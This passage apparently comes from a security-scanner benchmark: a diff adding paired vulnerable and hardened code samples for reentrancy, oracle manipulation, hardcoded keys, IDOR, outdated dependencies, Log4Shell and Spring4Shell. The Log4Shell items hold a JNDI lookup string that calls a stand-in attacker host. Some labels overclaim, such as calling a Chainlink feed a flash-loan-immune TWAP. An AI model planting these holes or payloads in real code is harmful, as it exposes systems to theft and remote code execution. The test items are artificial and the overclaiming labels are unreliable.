+    "deceptiveTrap": "Agent memory state merger without __proto__ filtering."
+  },
+  {
+    "id": "CYBERSEC-STATE-002-GOOD",
+    "suite": "CYBERSEC_EVAL",
+    "category": "PROTOTYPE_POLLUTION",
+    "cwe": "CWE-1321",
+    "name": "Hardened Memory State Guard #2",
+    "isVulnerable": false,
+    "language": "ts",
+    "filename": "cybersec/state/safe_2.ts",
+    "code": "\nexport function mergeAgentStateSafe_2(state: any, update: any) {\n  for (const key of Object.keys(update)) {\n    if (key === '__proto__' || key === 'constructor') continue;\n    state[key] = update[key];\n  }\n}\n",
+    "deceptiveTrap": "Filtered prototype keys."
+  },
+  {
+    "id": "WEB3-REENTRANCY-001-BAD",
+    "suite": "WEB3_DEFENSE",
+    "category": "SMART_CONTRACT",
+    "cwe": "CWE-841",
+    "name": "External Call State Update Reentrancy #1",
+    "isVulnerable": true,
+    "language": "sol",
+    "filename": "web3/reentrancy/vulnerable_1.sol",
+    "code": "\npragma solidity ^0.8.0;\ncontract Vault_1 {\n    mapping(address => uint256) public balances;\n    function withdraw() external {\n        uint256 bal = balances[msg.sender];\n        require(bal > 0);\n        (bool s,) = msg.sender.call{value: bal}(\"\");\n        require(s);\n        balances[msg.sender] = 0;\n    }\n}\n",
+    "deceptiveTrap": "State update occurs after untrusted external call."
+  },
+  {
+    "id": "WEB3-REENTRANCY-001-GOOD",
+    "suite": "WEB3_DEFENSE",
+    "category": "SMART_CONTRACT",
+    "cwe": "CWE-841",
+    "name": "Checks-Effects-Interactions Guard #1",
+    "isVulnerable": false,
+    "language": "sol",
+    "filename": "web3/reentrancy/safe_1.sol",
+    "code": "\npragma solidity ^0.8.0;\ncontract VaultSafe_1 {\n    mapping(address => uint256) public balances;\n    function withdraw() external {\n        uint256 bal = balances[msg.sender];\n        require(bal > 0);\n        balances[msg.sender] = 0;\n        (bool s,) = msg.sender.call{value: bal}(\"\");\n        require(s);\n    }\n}\n",
+    "deceptiveTrap": "Balance zeroed before external call."
+  },
+  {
+    "id": "WEB3-ORACLE-001-BAD",
+    "suite": "WEB3_DEFENSE",
+    "category": "SMART_CONTRACT",
+    "cwe": "CWE-682",
+    "name": "Spot AMM Reserves Oracle Price Manipulation #1",
+    "isVulnerable": true,
+    "language": "sol",
+    "filename": "web3/oracle/vulnerable_1.sol",
+    "code": "\ninterface IUniswapPair { function getReserves() external view returns (uint112, uint112, uint32); }\ncontract LendingPool_1 {\n    IUniswapPair public pair;\n    function getAssetPrice() public view returns (uint256) {\n        (uint112 r0, uint112 r1,) = pair.getReserves();\n        return uint256(r1) / uint256(r0);\n    }\n}\n",
+    "deceptiveTrap": "Vulnerable to single-transaction flash loan price skew."
+  },
+  {
+    "id": "WEB3-ORACLE-001-GOOD",
+    "suite": "WEB3_DEFENSE",
+    "category": "SMART_CONTRACT",
+    "cwe": "CWE-682",
+    "name": "Chainlink Decentralized Aggregator TWAP #1",
+    "isVulnerable": false,
+    "language": "sol",
+    "filename": "web3/oracle/safe_1.sol",
+    "code": "\ninterface AggregatorV3Interface { function latestRoundData() external view returns (uint80, int256, uint256, uint256, uint80); }\ncontract LendingPoolSafe_1 {\n    AggregatorV3Interface public priceFeed;\n    function getAssetPrice() public view returns (uint256) {\n        (, int256 price,,,) = priceFeed.latestRoundData();\n        return uint256(price);\n    }\n}\n",
+    "deceptiveTrap": "Chainlink oracle feed immune to flash loans."
+  },
+  {
+    "id": "WEB3-KEY-001-BAD",
+    "suite": "WEB3_DEFENSE",
+    "category": "WEB3",
+    "cwe": "CWE-312",
+    "name": "Hardcoded EVM Private Key Deployer #1",
+    "isVulnerable": true,
+    "language": "ts",
+    "filename": "web3/key/vulnerable_1.ts",
+    "code": "\nexport const deployer_key = \"0x4f3edf983ac636a65a842ce7c78d9aa706d3b113bce9c46f30d7d21715b23b1d\";\n",
+    "deceptiveTrap": "Exposed 64-char EVM private key."
+  },
+  {
+    "id": "WEB3-KEY-001-GOOD",
+    "suite": "WEB3_DEFENSE",
+    "category": "WEB3",
+    "cwe": "CWE-312",
+    "name": "Hardware Wallet Signer Interface #1",
+    "isVulnerable": false,
+    "language": "ts",
+    "filename": "web3/key/safe_1.ts",
+    "code": "\nexport const deployerAddress = \"0xd8dA6BF26964aF9D7eEd9e03E53415D37aA96045\";\n",
+    "deceptiveTrap": "Public Ethereum address only."
+  },
+  {
+    "id": "WEB3-SOL-001-BAD",
+    "suite": "WEB3_DEFENSE",
+    "category": "WEB3",
+    "cwe": "CWE-312",
+    "name": "Hardcoded Solana Base58 Secret Key #1",
+    "isVulnerable": true,
+    "language": "ts",
+    "filename": "web3/sol/vulnerable_1.ts",
+    "code": "\nexport const signer_secret = \"4Z8kQ6v4G2Y1W5x3F8h9K2m5P7j8R4t1N6b9V2c5X8z1M3k6J9h2L5p8Q1w4E7r9T2y5U8i1O3a5S7d9F1g3H5j7K9L1\";\n",
+    "deceptiveTrap": "Raw Base58 88-char Solana secret key."
+  },
+  {
+    "id": "WEB3-SOL-001-GOOD",
+    "suite": "WEB3_DEFENSE",
+    "category": "WEB3",
+    "cwe": "CWE-312",
+    "name": "Solana Public Address Resolution #1",
+    "isVulnerable": false,
+    "language": "ts",
+    "filename": "web3/sol/safe_1.ts",
+    "code": "\nexport const solanaPublicKey = \"BN2NZ8YqbTpRzXkvXJwPUiVSX4ZrKjbMy6WD9HZfYcrJ\";\n",
+    "deceptiveTrap": "Public address only."
+  },
+  {
+    "id": "WEB3-ANCHOR-001-BAD",
+    "suite": "WEB3_DEFENSE",
+    "category": "SMART_CONTRACT",
+    "cwe": "CWE-285",
+    "name": "Missing Signer Validation in Solana Instruction #1",
+    "isVulnerable": true,
+    "language": "rs",
+    "filename": "web3/anchor/vulnerable_1.rs",
+    "code": "\n#[program]\npub mod token_vault_1 {\n    use super::*;\n    pub fn emergency_drain(ctx: Context<DrainContext>) -> Result<()> {\n        // Missing signer check allows attacker to call\n        Ok(())\n    }\n}\n",
+    "deceptiveTrap": "Solana instruction lacking is_signer check."
+  },
+  {
+    "id": "WEB3-ANCHOR-001-GOOD",
+    "suite": "WEB3_DEFENSE",
+    "category": "SMART_CONTRACT",
+    "cwe": "CWE-285",
+    "name": "Anchor Strict Signer Type Constraint #1",
+    "isVulnerable": false,
+    "language": "rs",
+    "filename": "web3/anchor/safe_1.rs",
+    "code": "\n#[program]\npub mod token_vault_safe_1 {\n    use super::*;\n    pub fn emergency_drain(ctx: Context<DrainContext>) -> Result<()> {\n        require!(ctx.accounts.authority.is_signer, ErrorCode::Unauthorized);\n        Ok(())\n    }\n}\n",
+    "deceptiveTrap": "Strict Signer validation."
+  },
+  {
+    "id": "WEB3-REENTRANCY-002-BAD",
+    "suite": "WEB3_DEFENSE",
+    "category": "SMART_CONTRACT",
+    "cwe": "CWE-841",
+    "name": "External Call State Update Reentrancy #2",
+    "isVulnerable": true,
+    "language": "sol",
+    "filename": "web3/reentrancy/vulnerable_2.sol",
+    "code": "\npragma solidity ^0.8.0;\ncontract Vault_2 {\n    mapping(address => uint256) public balances;\n    function withdraw() external {\n        uint256 bal = balances[msg.sender];\n        require(bal > 0);\n        (bool s,) = msg.sender.call{value: bal}(\"\");\n        require(s);\n        balances[msg.sender] = 0;\n    }\n}\n",
+    "deceptiveTrap": "State update occurs after untrusted external call."
+  },
+  {
+    "id": "WEB3-REENTRANCY-002-GOOD",
+    "suite": "WEB3_DEFENSE",
+    "category": "SMART_CONTRACT",
+    "cwe": "CWE-841",
+    "name": "Checks-Effects-Interactions Guard #2",
+    "isVulnerable": false,
+    "language": "sol",
+    "filename": "web3/reentrancy/safe_2.sol",
+    "code": "\npragma solidity ^0.8.0;\ncontract VaultSafe_2 {\n    mapping(address => uint256) public balances;\n    function withdraw() external {\n        uint256 bal = balances[msg.sender];\n        require(bal > 0);\n        balances[msg.sender] = 0;\n        (bool s,) = msg.sender.call{value: bal}(\"\");\n        require(s);\n    }\n}\n",
+    "deceptiveTrap": "Balance zeroed before external call."
+  },
+  {
+    "id": "WEB3-ORACLE-002-BAD",
+    "suite": "WEB3_DEFENSE",
+    "category": "SMART_CONTRACT",
+    "cwe": "CWE-682",
+    "name": "Spot AMM Reserves Oracle Price Manipulation #2",
+    "isVulnerable": true,
+    "language": "sol",
+    "filename": "web3/oracle/vulnerable_2.sol",
+    "code": "\ninterface IUniswapPair { function getReserves() external view returns (uint112, uint112, uint32); }\ncontract LendingPool_2 {\n    IUniswapPair public pair;\n    function getAssetPrice() public view returns (uint256) {\n        (uint112 r0, uint112 r1,) = pair.getReserves();\n        return uint256(r1) / uint256(r0);\n    }\n}\n",
+    "deceptiveTrap": "Vulnerable to single-transaction flash loan price skew."
+  },
+  {
+    "id": "WEB3-ORACLE-002-GOOD",
+    "suite": "WEB3_DEFENSE",
+    "category": "SMART_CONTRACT",
+    "cwe": "CWE-682",
+    "name": "Chainlink Decentralized Aggregator TWAP #2",
+    "isVulnerable": false,
+    "language": "sol",
+    "filename": "web3/oracle/safe_2.sol",
+    "code": "\ninterface AggregatorV3Interface { function latestRoundData() external view returns (uint80, int256, uint256, uint256, uint80); }\ncontract LendingPoolSafe_2 {\n    AggregatorV3Interface public priceFeed;\n    function getAssetPrice() public view returns (uint256) {\n        (, int256 price,,,) = priceFeed.latestRoundData();\n        return uint256(price);\n    }\n}\n",
+    "deceptiveTrap": "Chainlink oracle feed immune to flash loans."
+  },
+  {
+    "id": "WEB3-KEY-002-BAD",
+    "suite": "WEB3_DEFENSE",
+    "category": "WEB3",
+    "cwe": "CWE-312",
+    "name": "Hardcoded EVM Private Key Deployer #2",
+    "isVulnerable": true,
+    "language": "ts",
+    "filename": "web3/key/vulnerable_2.ts",
+    "code": "\nexport const deployer_key = \"0x4f3edf983ac636a65a842ce7c78d9aa706d3b113bce9c46f30d7d21715b23b1d\";\n",
+    "deceptiveTrap": "Exposed 64-char EVM private key."
+  },
+  {
+    "id": "WEB3-KEY-002-GOOD",
+    "suite": "WEB3_DEFENSE",
+    "category": "WEB3",
+    "cwe": "CWE-312",
+    "name": "Hardware Wallet Signer Interface #2",
+    "isVulnerable": false,
+    "language": "ts",
+    "filename": "web3/key/safe_2.ts",
+    "code": "\nexport const deployerAddress = \"0xd8dA6BF26964aF9D7eEd9e03E53415D37aA96045\";\n",
+    "deceptiveTrap": "Public Ethereum address only."
+  },
+  {
+    "id": "BIZ-IDOR-001-BAD",
+    "suite": "BUSINESS_LOGIC_IDOR",
+    "category": "BUSINESS_LOGIC",
+    "cwe": "CWE-639",
+    "name": "Financial IDOR Account Drain #1",
+    "isVulnerable": true,
+    "language": "ts",
+    "filename": "biz/idor/vulnerable_1.ts",
+    "code": "\nimport express from 'express';\nconst app = express();\napp.post('/api/wallet/transfer', (req, res) => {\n  const { fromUser, toUser, amount } = req.body;\n  // Financial IDOR: fromUser taken directly from client body without session binding\n  transferFunds(fromUser, toUser, amount);\n  res.json({ success: true });\n});\nfunction transferFunds(a: any, b: any, c: any) {}\n",
+    "deceptiveTrap": "Client dictates fromUser parameter."
+  },
+  {
+    "id": "BIZ-IDOR-002-BAD",
+    "suite": "BUSINESS_LOGIC_IDOR",
+    "category": "BUSINESS_LOGIC",
+    "cwe": "CWE-639",
+    "name": "Financial IDOR Account Drain #2",
+    "isVulnerable": true,
+    "language": "ts",
+    "filename": "biz/idor/vulnerable_2.ts",
+    "code": "\nimport express from 'express';\nconst app = express();\napp.post('/api/wallet/transfer', (req, res) => {\n  const { fromUser, toUser, amount } = req.body;\n  // Financial IDOR: fromUser taken directly from client body without session binding\n  transferFunds(fromUser, toUser, amount);\n  res.json({ success: true });\n});\nfunction transferFunds(a: any, b: any, c: any) {}\n",
+    "deceptiveTrap": "Client dictates fromUser parameter."
+  },
+  {
+    "id": "BIZ-IDOR-003-BAD",
+    "suite": "BUSINESS_LOGIC_IDOR",
+    "category": "BUSINESS_LOGIC",
+    "cwe": "CWE-639",
+    "name": "Financial IDOR Account Drain #3",
+    "isVulnerable": true,
+    "language": "ts",
+    "filename": "biz/idor/vulnerable_3.ts",
+    "code": "\nimport express from 'express';\nconst app = express();\napp.post('/api/wallet/transfer', (req, res) => {\n  const { fromUser, toUser, amount } = req.body;\n  // Financial IDOR: fromUser taken directly from client body without session binding\n  transferFunds(fromUser, toUser, amount);\n  res.json({ success: true });\n});\nfunction transferFunds(a: any, b: any, c: any) {}\n",
+    "deceptiveTrap": "Client dictates fromUser parameter."
+  },
+  {
+    "id": "BIZ-IDOR-004-BAD",
+    "suite": "BUSINESS_LOGIC_IDOR",
+    "category": "BUSINESS_LOGIC",
+    "cwe": "CWE-639",
+    "name": "Financial IDOR Account Drain #4",
+    "isVulnerable": true,
+    "language": "ts",
+    "filename": "biz/idor/vulnerable_4.ts",
+    "code": "\nimport express from 'express';\nconst app = express();\napp.post('/api/wallet/transfer', (req, res) => {\n  const { fromUser, toUser, amount } = req.body;\n  // Financial IDOR: fromUser taken directly from client body without session binding\n  transferFunds(fromUser, toUser, amount);\n  res.json({ success: true });\n});\nfunction transferFunds(a: any, b: any, c: any) {}\n",
+    "deceptiveTrap": "Client dictates fromUser parameter."
+  },
+  {
+    "id": "BIZ-IDOR-005-BAD",
+    "suite": "BUSINESS_LOGIC_IDOR",
+    "category": "BUSINESS_LOGIC",
+    "cwe": "CWE-639",
+    "name": "Financial IDOR Account Drain #5",
+    "isVulnerable": true,
+    "language": "ts",
+    "filename": "biz/idor/vulnerable_5.ts",
+    "code": "\nimport express from 'express';\nconst app = express();\napp.post('/api/wallet/transfer', (req, res) => {\n  const { fromUser, toUser, amount } = req.body;\n  // Financial IDOR: fromUser taken directly from client body without session binding\n  transferFunds(fromUser, toUser, amount);\n  res.json({ success: true });\n});\nfunction transferFunds(a: any, b: any, c: any) {}\n",
+    "deceptiveTrap": "Client dictates fromUser parameter."
+  },
+  {
+    "id": "BIZ-IDOR-006-BAD",
+    "suite": "BUSINESS_LOGIC_IDOR",
+    "category": "BUSINESS_LOGIC",
+    "cwe": "CWE-639",
+    "name": "Financial IDOR Account Drain #6",
+    "isVulnerable": true,
+    "language": "ts",
+    "filename": "biz/idor/vulnerable_6.ts",
+    "code": "\nimport express from 'express';\nconst app = express();\napp.post('/api/wallet/transfer', (req, res) => {\n  const { fromUser, toUser, amount } = req.body;\n  // Financial IDOR: fromUser taken directly from client body without session binding\n  transferFunds(fromUser, toUser, amount);\n  res.json({ success: true });\n});\nfunction transferFunds(a: any, b: any, c: any) {}\n",
+    "deceptiveTrap": "Client dictates fromUser parameter."
+  },
+  {
+    "id": "BIZ-IDOR-007-BAD",
+    "suite": "BUSINESS_LOGIC_IDOR",
+    "category": "BUSINESS_LOGIC",
+    "cwe": "CWE-639",
+    "name": "Financial IDOR Account Drain #7",
+    "isVulnerable": true,
+    "language": "ts",
+    "filename": "biz/idor/vulnerable_7.ts",
+    "code": "\nimport express from 'express';\nconst app = express();\napp.post('/api/wallet/transfer', (req, res) => {\n  const { fromUser, toUser, amount } = req.body;\n  // Financial IDOR: fromUser taken directly from client body without session binding\n  transferFunds(fromUser, toUser, amount);\n  res.json({ success: true });\n});\nfunction transferFunds(a: any, b: any, c: any) {}\n",
+    "deceptiveTrap": "Client dictates fromUser parameter."
+  },
+  {
+    "id": "BIZ-IDOR-008-BAD",
+    "suite": "BUSINESS_LOGIC_IDOR",
+    "category": "BUSINESS_LOGIC",
+    "cwe": "CWE-639",
+    "name": "Financial IDOR Account Drain #8",
+    "isVulnerable": true,
+    "language": "ts",
+    "filename": "biz/idor/vulnerable_8.ts",
+    "code": "\nimport express from 'express';\nconst app = express();\napp.post('/api/wallet/transfer', (req, res) => {\n  const { fromUser, toUser, amount } = req.body;\n  // Financial IDOR: fromUser taken directly from client body without session binding\n  transferFunds(fromUser, toUser, amount);\n  res.json({ success: true });\n});\nfunction transferFunds(a: any, b: any, c: any) {}\n",
+    "deceptiveTrap": "Client dictates fromUser parameter."
+  },
+  {
+    "id": "BIZ-IDOR-001-GOOD",
+    "suite": "BUSINESS_LOGIC_IDOR",
+    "category": "BUSINESS_LOGIC",
+    "cwe": "CWE-639",
+    "name": "Session Bound Wallet Transfer #1",
+    "isVulnerable": false,
+    "language": "ts",
+    "filename": "biz/idor/safe_1.ts",
+    "code": "\nimport express from 'express';\nconst app = express();\napp.post('/api/wallet/transfer', (req: any, res) => {\n  const fromUser = req.session.userId;\n  const { toUser, amount } = req.body;\n  transferFunds(fromUser, toUser, amount);\n  res.json({ success: true });\n});\nfunction transferFunds(a: any, b: any, c: any) {}\n",
+    "deceptiveTrap": "fromUser rigorously resolved from server-side authenticated session."
+  },
+  {
+    "id": "BIZ-IDOR-002-GOOD",
+    "suite": "BUSINESS_LOGIC_IDOR",
+    "category": "BUSINESS_LOGIC",
+    "cwe": "CWE-639",
+    "name": "Session Bound Wallet Transfer #2",
+    "isVulnerable": false,
+    "language": "ts",
+    "filename": "biz/idor/safe_2.ts",
+    "code": "\nimport express from 'express';\nconst app = express();\napp.post('/api/wallet/transfer', (req: any, res) => {\n  const fromUser = req.session.userId;\n  const { toUser, amount } = req.body;\n  transferFunds(fromUser, toUser, amount);\n  res.json({ success: true });\n});\nfunction transferFunds(a: any, b: any, c: any) {}\n",
+    "deceptiveTrap": "fromUser rigorously resolved from server-side authenticated session."
+  },
+  {
+    "id": "BIZ-IDOR-003-GOOD",
+    "suite": "BUSINESS_LOGIC_IDOR",
+    "category": "BUSINESS_LOGIC",
+    "cwe": "CWE-639",
+    "name": "Session Bound Wallet Transfer #3",
+    "isVulnerable": false,
+    "language": "ts",
+    "filename": "biz/idor/safe_3.ts",
+    "code": "\nimport express from 'express';\nconst app = express();\napp.post('/api/wallet/transfer', (req: any, res) => {\n  const fromUser = req.session.userId;\n  const { toUser, amount } = req.body;\n  transferFunds(fromUser, toUser, amount);\n  res.json({ success: true });\n});\nfunction transferFunds(a: any, b: any, c: any) {}\n",
+    "deceptiveTrap": "fromUser rigorously resolved from server-side authenticated session."
+  },
+  {
+    "id": "BIZ-IDOR-004-GOOD",
+    "suite": "BUSINESS_LOGIC_IDOR",
+    "category": "BUSINESS_LOGIC",
+    "cwe": "CWE-639",
+    "name": "Session Bound Wallet Transfer #4",
+    "isVulnerable": false,
+    "language": "ts",
+    "filename": "biz/idor/safe_4.ts",
+    "code": "\nimport express from 'express';\nconst app = express();\napp.post('/api/wallet/transfer', (req: any, res) => {\n  const fromUser = req.session.userId;\n  const { toUser, amount } = req.body;\n  transferFunds(fromUser, toUser, amount);\n  res.json({ success: true });\n});\nfunction transferFunds(a: any, b: any, c: any) {}\n",
+    "deceptiveTrap": "fromUser rigorously resolved from server-side authenticated session."
+  },
+  {
+    "id": "REAL-CVE-001-BAD",
+    "suite": "REAL_WORLD_CVE",
+    "category": "ZERO_DAY_EXPLOIT",
+    "cwe": "CWE-917",
+    "name": "Log4Shell (CVE-2021-44228) Ingestion Variant #1",
+    "isVulnerable": true,
+    "language": "java",
+    "filename": "cve/cve-2021-44228/vulnerable_1.java",
+    "code": "\npublic class ExploitTest_0_1 {\n    public void test(String untrusted, String safeId) {\n        logger.error(\"${jndi:ldap://evil.com/x}\");\n    }\n}\n",
+    "deceptiveTrap": "Known enterprise exploit sink for Log4Shell (CVE-2021-44228)."
+  },
+  {
+    "id": "REAL-CVE-001-GOOD",
+    "suite": "REAL_WORLD_CVE",
+    "category": "ZERO_DAY_EXPLOIT",
+    "cwe": "CWE-917",
+    "name": "Log4Shell (CVE-2021-44228) Enterprise Mitigation #1",
+    "isVulnerable": false,
+    "language": "java",
+    "filename": "cve/cve-2021-44228/safe_1.java",
+    "code": "\npublic class ExploitTestSafe_0_1 {\n    public void test(String untrusted, String safeId) {\n        logger.error(\"Error occurred with id: {}\", safeId);\n    }\n}\n",
+    "deceptiveTrap": "Defensive mitigation against Log4Shell (CVE-2021-44228)."
+  },
+  {
+    "id": "REAL-CVE-002-BAD",
+    "suite": "REAL_WORLD_CVE",
+    "category": "ZERO_DAY_EXPLOIT",
+    "cwe": "CWE-917",
+    "name": "Log4Shell (CVE-2021-44228) Ingestion Variant #2",
+    "isVulnerable": true,
+    "language": "java",
+    "filename": "cve/cve-2021-44228/vulnerable_2.java",
+    "code": "\npublic class ExploitTest_0_2 {\n    public void test(String untrusted, String safeId) {\n        logger.error(\"${jndi:ldap://evil.com/x}\");\n    }\n}\n",
+    "deceptiveTrap": "Known enterprise exploit sink for Log4Shell (CVE-2021-44228)."
+  },
+  {
+    "id": "REAL-CVE-002-GOOD",
+    "suite": "REAL_WORLD_CVE",
+    "category": "ZERO_DAY_EXPLOIT",
+    "cwe": "CWE-917",
+    "name": "Log4Shell (CVE-2021-44228) Enterprise Mitigation #2",
+    "isVulnerable": false,
+    "language": "java",
+    "filename": "cve/cve-2021-44228/safe_2.java",
+    "code": "\npublic class ExploitTestSafe_0_2 {\n    public void test(String untrusted, String safeId) {\n        logger.error(\"Error occurred with id: {}\", safeId);\n    }\n}\n",
+    "deceptiveTrap": "Defensive mitigation against Log4Shell (CVE-2021-44228)."
+  },
+  {
+    "id": "REAL-CVE-003-BAD",
+    "suite": "REAL_WORLD_CVE",
+    "category": "ZERO_DAY_EXPLOIT",
+    "cwe": "CWE-917",
+    "name": "Log4Shell (CVE-2021-44228) Ingestion Variant #3",
+    "isVulnerable": true,
+    "language": "java",
+    "filename": "cve/cve-2021-44228/vulnerable_3.java",
+    "code": "\npublic class ExploitTest_0_3 {\n    public void test(String untrusted, String safeId) {\n        logger.error(\"${jndi:ldap://evil.com/x}\");\n    }\n}\n",
+    "deceptiveTrap": "Known enterprise exploit sink for Log4Shell (CVE-2021-44228)."
+  },
+  {
+    "id": "REAL-CVE-003-GOOD",
+    "suite": "REAL_WORLD_CVE",
+    "category": "ZERO_DAY_EXPLOIT",
+    "cwe": "CWE-917",
+    "name": "Log4Shell (CVE-2021-44228) Enterprise Mitigation #3",
+    "isVulnerable": false,
+    "language": "java",
+    "filename": "cve/cve-2021-44228/safe_3.java",
+    "code": "\npublic class ExploitTestSafe_0_3 {\n    public void test(String untrusted, String safeId) {\n        logger.error(\"Error occurred with id: {}\", safeId);\n    }\n}\n",
+    "deceptiveTrap": "Defensive mitigation against Log4Shell (CVE-2021-44228)."
+  },
+  {
+    "id": "REAL-CVE-004-BAD",
+    "suite": "REAL_WORLD_CVE",
+    "category": "ZERO_DAY_EXPLOIT",
+    "cwe": "CWE-94",
+    "name": "Spring4Shell (CVE-2022-22965) Ingestion Variant #1",
+    "isVulnerable": true,
+    "language": "java",
+    "filename": "cve/cve-2022-22965/vulnerable_1.java",
+    "code": "\npublic class ExploitTest_1_1 {\n    public void test(String untrusted, String safeId) {\n        class.module.classLoader.resources.context.parent.pipeline.first.pattern = \"%{c2}i\";\n    }\n}\n",
+    "deceptiveTrap": "Known enterprise exploit sink for Spring4Shell (CVE-2022-22965)."
+  },
+  {
+    "id": "REAL-CVE-004-GOOD",
+    "suite": "REAL_WORLD_CVE",
+    "category": "ZERO_DAY_EXPLOIT",
+    "cwe": "CWE-94",
+    "name": "Spring4Shell (CVE-2022-22965) Enterprise Mitigation #1",
+    "isVulnerable": false,
+    "language": "java",
+    "filename": "cve/cve-2022-22965/safe_1.java",
+    "code": "\npublic class ExploitTestSafe_1_1 {\n    public void test(String untrusted, String safeId) {\n        binder.setDisallowedFields(\"class.*\", \"Class.*\");\n    }\n}\n",
+    "deceptiveTrap": "Defensive mitigation against Spring4Shell (CVE-2022-22965)."
+  },
+  {
+    "id": "SCA-NPM-001-BAD",
+    "suite": "DEPENDENCY_SCA",
+    "category": "DEPENDENCY",
+    "cwe": "CWE-1321",
+    "name": "Vulnerable Dependency lodash@4.17.15 (Prototype Pollution in lodash) #1",
+    "isVulnerable": true,
+    "language": "json",
+    "filename": "sca_manifests/bad_1/package.json",
+    "code": "{\n  \"name\": \"vulnerable-app-1\",\n  \"version\": \"1.0.0\",\n  \"dependencies\": {\n    \"lodash\": \"4.17.15\"\n  }\n}",
+    "deceptiveTrap": "Known vulnerable version of lodash."
+  },
+  {
+    "id": "SCA-NPM-002-BAD",
+    "suite": "DEPENDENCY_SCA",
+    "category": "DEPENDENCY",
+    "cwe": "CWE-918",
+    "name": "Vulnerable Dependency axios@0.21.1 (SSRF in axios) #2",
+    "isVulnerable": true,
+    "language": "json",
+    "filename": "sca_manifests/bad_2/package.json",
+    "code": "{\n  \"name\": \"vulnerable-app-2\",\n  \"version\": \"1.0.0\",\n  \"dependencies\": {\n    \"axios\": \"0.21.1\"\n  }\n}",
+    "deceptiveTrap": "Known vulnerable version of axios."
+  },
+  {
+    "id": "SCA-NPM-003-BAD",
+    "suite": "DEPENDENCY_SCA",
+    "category": "DEPENDENCY",
+    "cwe": "CWE-94",
+    "name": "Vulnerable Dependency jsonwebtoken@8.5.1 (RCE in jsonwebtoken) #3",
+    "isVulnerable": true,
+    "language": "json",
+    "filename": "sca_manifests/bad_3/package.json",
+    "code": "{\n  \"name\": \"vulnerable-app-3\",\n  \"version\": \"1.0.0\",\n  \"dependencies\": {\n    \"jsonwebtoken\": \"8.5.1\"\n  }\n}",
+    "deceptiveTrap": "Known vulnerable version of jsonwebtoken."
+  },
+  {
+    "id": "SCA-NPM-004-BAD",
+    "suite": "DEPENDENCY_SCA",
+    "category": "DEPENDENCY",
+    "cwe": "CWE-601",
+    "name": "Vulnerable Dependency express@4.18.1 (Open redirect in express) #4",
+    "isVulnerable": true,
+    "language": "json",
+    "filename": "sca_manifests/bad_4/package.json",
+    "code": "{\n  \"name\": \"vulnerable-app-4\",\n  \"version\": \"1.0.0\",\n  \"dependencies\": {\n    \"express\": \"4.18.1\"\n  }\n}",
+    "deceptiveTrap": "Known vulnerable version of express."
+  },
+  {
+    "id": "SCA-NPM-005-BAD",
+    "suite": "DEPENDENCY_SCA",
+    "category": "DEPENDENCY",
+    "cwe": "CWE-22",
+    "name": "Vulnerable Dependency tar@6.1.11 (Path traversal in tar) #5",
+    "isVulnerable": true,
+    "language": "json",
+    "filename": "sca_manifests/bad_5/package.json",
+    "code": "{\n  \"name\": \"vulnerable-app-5\",\n  \"version\": \"1.0.0\",\n  \"dependencies\": {\n    \"tar\": \"6.1.11\"\n  }\n}",
+    "deceptiveTrap": "Known vulnerable version of tar."
+  },
+  {
+    "id": "SCA-NPM-006-BAD",
+    "suite": "DEPENDENCY_SCA",
+    "category": "DEPENDENCY",
+    "cwe": "CWE-1321",
+    "name": "Vulnerable Dependency minimist@1.2.5 (Prototype pollution in minimist) #6",
+    "isVulnerable": true,
+    "language": "json",
+    "filename": "sca_manifests/bad_6/package.json",
+    "code": "{\n  \"name\": \"vulnerable-app-6\",\n  \"version\": \"1.0.0\",\n  \"dependencies\": {\n    \"minimist\": \"1.2.5\"\n  }\n}",
+    "deceptiveTrap": "Known vulnerable version of minimist."
+  },
+  {
+    "id": "SCA-NPM-007-BAD",
+    "suite": "DEPENDENCY_SCA",
+    "category": "DEPENDENCY",
+    "cwe": "CWE-1333",
+    "name": "Vulnerable Dependency moment@2.29.3 (ReDoS in moment) #7",
+    "isVulnerable": true,
+    "language": "json",
+    "filename": "sca_manifests/bad_7/package.json",
+    "code": "{\n  \"name\": \"vulnerable-app-7\",\n  \"version\": \"1.0.0\",\n  \"dependencies\": {\n    \"moment\": \"2.29.3\"\n  }\n}",
+    "deceptiveTrap": "Known vulnerable version of moment."
+  },
+  {
+    "id": "SCA-NPM-008-BAD",
+    "suite": "DEPENDENCY_SCA",
+    "category": "DEPENDENCY",
+    "cwe": "CWE-1321",
+    "name": "Vulnerable Dependency lodash@4.17.15 (Prototype Pollution in lodash) #8",
+    "isVulnerable": true,
+    "language": "json",
+    "filename": "sca_manifests/bad_8/package.json",
+    "code": "{\n  \"name\": \"vulnerable-app-8\",\n  \"version\": \"1.0.0\",\n  \"dependencies\": {\n    \"lodash\": \"4.17.15\"\n  }\n}",
+    "deceptiveTrap": "Known vulnerable version of lodash."
   }
 ];
